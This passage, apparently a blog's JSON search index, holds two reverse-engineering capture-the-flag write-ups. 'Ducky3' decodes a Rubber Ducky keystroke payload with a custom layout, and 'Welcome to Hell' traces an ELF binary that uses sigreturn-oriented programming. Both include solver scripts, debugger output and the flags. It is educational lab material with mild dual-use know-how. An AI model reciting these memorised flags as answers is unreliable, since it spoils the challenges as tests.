initially. As the description says, this file dosn\u0026rsquo;t seem to match any language, and appears to be custom made. The challenge was later fixed to include payload.txt.\nSTRING abcdefghijklmnopqrstuvwxyz STRING ABCDEFGHIJKLMNOPQRSTUVWXYZ STRING 0123456789 STRING !@#$%^\u0026amp;*()-_ STRING payload.","tags":["BYUCTF 2023","ctf write-up","reversing"],"text":"ducky3 category: rev difficulty: medium points: 497 solves: 14 description alright fine, i\u0026rsquo;ll make my own keyboard layout\u0026hellip;\nfiles inject.bin - data payload.txt - ascii text\nsolve this challenge only provided another inject.bin file initially. as the description says, this file dosn\u0026rsquo;t seem to match any language, and appears to be custom made. the challenge was later fixed to include payload.txt.\nstring abcdefghijklmnopqrstuvwxyz string abcdefghijklmnopqrstuvwxyz string 0123456789 string !@#$%^\u0026amp;*()-_ string payload.txt seems to be part of the payload that was encoded into inject.bin. looking into how the ducktoolkit encoder works reveals that \u0026lsquo;string\u0026rsquo; will simply encode the following string in the payload. this tells us that first part of inject.bin encodes the string abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()-_\nwe can use this to figure out the keycodes and decode the rest of the file.\nfpath = \u0026#39;./inject.bin\u0026#39; ht = {} keys = {} keystr = \u0026#39;abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()-_\u0026#39; #keys[\u0026#39;{ 0x65}\u0026#39;] = \u0026#39;c\u0026#39; #keys[\u0026#39;{2 0x6}\u0026#39;] = \u0026#39;{\u0026#39; #keys[\u0026#39;{2 0x10}\u0026#39;] = \u0026#39;}\u0026#39; # read in data from inject.bin with open(fpath, \u0026#39;rb\u0026#39;) as file: data = file.read() def read_keycode(data, datidx): keycode = \u0026#39;\u0026#39; if data[datidx+1] == 2: # determine shift modifier from second byte keycode = keycode + \u0026#39;{2 \u0026#39; else: keycode = keycode + \u0026#39;{ \u0026#39; keycode = keycode + hex(data[datidx]) + \u0026#39;}\u0026#39; # determine keycode from first byte return keycode # iterate over keystring and map keycodes to chars for stridx, c in enumerate(keystr): datidx = stridx * 2 # keycodes are 2 bytes keycode = read_keycode(data, datidx) # map keycode to key character if not (keycode in keys): keys[keycode] = keystr[stridx] # iterate over data and print decoded keys for datidx in range(0, len(data), 2): keycode = read_keycode(data, datidx) if keycode in keys: print(keys[keycode], end=\u0026#39;\u0026#39;) else: print(keycode, end=\u0026#39;\u0026#39;) print() because the encodings for \u0026lsquo;{\u0026rsquo; and \u0026lsquo;}\u0026rsquo; were not given, we have to figure out their mappings. this is simple because they are the only two unmapped chars. the characters \u0026lsquo;b\u0026rsquo; and \u0026lsquo;c\u0026rsquo; also have the same keycode of 0x6500 for some reason but we can manually map these values by uncommenting the following lines.\n#keys[\u0026#39;{ 0x65}\u0026#39;] = \u0026#39;c\u0026#39; #keys[\u0026#39;{2 0x6}\u0026#39;] = \u0026#39;{\u0026#39; #keys[\u0026#39;{2 0x10}\u0026#39;] = \u0026#39;}\u0026#39; this allows us to determine the flag. byuctf{1_h0p3_y0u_enj0yed-thi5_very_much}\n","title":"Ducky3"},{"date":"2023-03-30","image":"","imageAlt":"","link":"https://treseco.github.io/posts/umassctf23/welcome_to_hell/","summary":"Welcome To Hell Author: Battelle Rev 400 pts Description Welcome to hell, where all it seems that you can do is try to exit, maybe there is a flag hidden somewhere in this mess\nFiles welcome_to_hell - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped\nReversing Opening welcome_to_hell in Ghidra shows a few functions. The only one that appears to do anything useful is entry, the first function in the binary.","tags":["ctf write-up","reversing","UMass CTF 2023"],"text":"welcome to hell author: battelle rev 400 pts description welcome to hell, where all it seems that you can do is try to exit, maybe there is a flag hidden somewhere in this mess\nfiles welcome_to_hell - elf 64-bit lsb executable, x86-64, version 1 (sysv), statically linked, not stripped\nreversing opening welcome_to_hell in ghidra shows a few functions. the only one that appears to do anything useful is entry, the first function in the binary. there are many other functions at higher addresses than entry, but they each just call syscall to exit the program. the return value of the nth exit function is n.\nvoid entry(void) { int offset; char *bufptr; char buf [8]; bool neg; syscall(); //read 3 bytes from stdin to buf offset = 0; neg = false; bufptr = buf + 1; if (buf[0] == \u0026#39;-\u0026#39;) { neg = true; bufptr = buf + 2; buf[0] = buf[1]; } do { offset = offset * 10 + (int)(char)(buf[0] + -0x30); buf[0] = *bufptr; if (buf[0] \u0026lt; \u0026#39;0\u0026#39;) break; bufptr = bufptr + 1; } while (buf[0] \u0026lt; \u0026#39;:\u0026#39;); if (neg) { offset = -offset; } (*(base + (int)((long)offset * 0x11)))(0,offset,(ulong)((long)offset * 0x11) \u0026gt;\u0026gt; 0x20); return; } entry provides some hints at what we should do. first, we see that we can provide some input that will jump to somewhere in the program. the address that we jump to is determined by an offset from base, which is the first exit function that follows entry. we could reverse the address calculations, or just test different offsets and see what exit code is returned.\n$ ./welcome_to_hell 1 $ echo $? 1 $ ./welcome_to_hell 2 $ echo $? 2 $ ./welcome_to_hell 50 $ echo $? 50 clearly the offset is just the number of exit functions to jump over. however, everything past base exits the program and is not useful. luckily we can see from entry that we can jump to negative offsets too. but where should we jump to? after looking around we realize that most of the data before base is just elf headers. the most obvious choice is the suspicious data found in the string table. decompiling this data does appear to give us intructions but also some invalid instrucitons. there seems to be syscalls in this code, so instead of reversing the invalid instructions let\u0026rsquo;s use strace.\n$ echo \u0026#39;-30\u0026#39; | strace ./welcome_to_hell execve(\u0026#34;./welcome_to_hell\u0026#34;, [\u0026#34;./welcome_to_hell\u0026#34;], 0x7ffe934ba3c0 /* 10 vars */) = 0 read(0, \u0026#34;-30\u0026#34;, 3) = 3 mmap(0x41414141000, 16384, prot_read|prot_write|prot_exec, map_private|map_fixed|map_anonymous, 0, 0) = 0x41414141000 open(\u0026#34;./welcome_to_hell\u0026#34;, o_rdonly) = 3 lseek(3, 176, seek_set) = 176 read(3, \u0026#34;!\\340\\214!\\350\\205ilii\\1ibhh\\350]mhhhh!\\321\\1\\10\\5\\5\\f\\7\\16\\f\u0026#34;..., 12112) = 12112 write(1, \u0026#34;welcome to the challenge!\\n\u0026#34;, 26welcome to the challenge! ) = 26 write(1, \u0026#34;enter the flag: \u0026#34;, 16enter the flag: ) = 16 read(0, \u0026#34;\\n\u0026#34;, 48) = 1 exit(25) = ? +++ exited with 25 +++ the programs first reads in the 3 byte offset, same as before. we pass in \u0026lsquo;-30\u0026rsquo; to jump to the beginning of the string table and run the instuctions there. the program then calls mmap, open, lseek, and read to read in data from the binary and map it into memory. then we are welcomed to the challenge, and finally get the flag prompt. the program then quits, presumably because we didn\u0026rsquo;t give the flag. let\u0026rsquo;s look with gdb.\n► 0x4141414108f syscall \u0026lt;sys_read\u0026gt; fd: 0x0 (/dev/pts/0) buf: 0x41414142fd0 ◂— xor esi, dword ptr [rbx] /* 0x3333333333333333 */ nbytes: 0x30 0x41414141091 mov rdx, rax 0x41414141094 mov rdi, 0x19 0x4141414109e je 0x414141410a9 \u0026lt;0x414141410a9\u0026gt; 0x414141410a0 mov rax, 0x3c 0x414141410a7 syscall 0x414141410a9 nop eventually, reach the read syscall where the flag is read. we can see that if read returns a length other than 0x19 then the program exits. we\u0026rsquo;ll give it a 25 character sting and continue stepping.\n0x414141410a9 nop 0x414141410aa lea rsp, [rip + 9] 0x414141410b1 mov rax, 0xf ► 0x414141410b8 syscall \u0026lt;sys_rt_sigreturn\u0026gt; 0x414141410ba add byte ptr [rax], al 0x414141410bc add byte ptr [rax], al 0x414141410be add byte ptr [rax], al 0x414141410c0 add byte ptr [rax], al 0x414141410c2 add byte ptr [rax], al ok now that the flag length is correct we are at the instuctions above, which points the stack pointer to the data after the syscall and calls rt_sigreturn. this is a function used to restore the process state after the program returns from handling a signal. typically the state is stored on the stack before control is transfered to the kernel, and restored by sigreturn when the kernel is done. in this case there is no signal, and the program is using its own fabricated signal frame (the junk instructions after the syscall) to modify the process state. this is a pwn technique know as srop.\n► 0x414141411b2 add r9, rcx 0x414141411b5 mov r10, qword ptr [r9 + 1] 0x414141411b9 xor rax, r8 0x414141411bc add cl, 0xb 0x414141411bf shr rax, cl 0x414141411c2 cmp al, r10b 0x414141411c5 je 0x414141411c9 \u0026lt;0x414141411c9\u0026gt; 0x414141411c7 jmp rdx 0x414141411c9 nop 0x414141411ca lea rsp, [rip + 9] 0x414141411d1 mov rax, 0xf 0x414141411d8 syscall each signal frame that is \u0026ldquo;restored\u0026rdquo; has the format above. r10 is pointed to the next character in our flag. some operations are perfomed on rax, but by the compare instruction it will be the correct flag character. at this point we can just contine stepping through, dumping rax, and setting r10 to get the full flag.\n#!/usr/bin/python3 from pwn import * p = process(\u0026#39;./welcome_to_hell\u0026#39;) p.send(b\u0026#39;-30\u0026#39;) p.recvline() p.recvuntil(b\u0026#39;flag: \u0026#39;) p.send(b\u0026#39;umass{sr0p_n_r3v_is_h3ll}\u0026#39;) print(p.recvall()) pwntools is usefull to test the flag we found by passing it to to program before it quits and without newlines.\n$ ./heaven.py [+] starting local process \u0026#39;./welcome_to_hell\u0026#39;: pid 1178 [+] receiving all data: done (25b) [*] stopped process \u0026#39;./welcome_to_hell\u0026#39; (pid 1178) b\u0026#39;umass{sr0p_n_r3v_is_h3ll}\u0026#39; nice. overall this was a cool challenge. i certainly learned a lot about the elf file format and especially unix signals. srop is new to me so this was a neat chance to learn about how it works and how it can be used.\n","title":"Welcome to Hell"}]
}

